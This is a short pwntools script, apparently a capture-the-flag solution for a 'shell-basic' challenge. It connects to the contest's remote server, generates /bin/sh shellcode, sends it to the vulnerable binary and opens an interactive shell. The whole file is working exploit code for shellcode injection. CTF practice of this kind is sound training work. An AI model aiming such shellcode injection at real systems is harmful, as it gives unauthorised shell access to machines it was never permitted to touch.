from pwn import *

elf = context.binary = ELF('./chall')

# pc = process("./chall")
pc = remote("shell-basic-pwn.wanictf.org", "9004",)

shell_code = asm(shellcraft.sh())  # PUT YOUR SHELL CODE HERE

pc.sendline(shell_code)
pc.interactive()
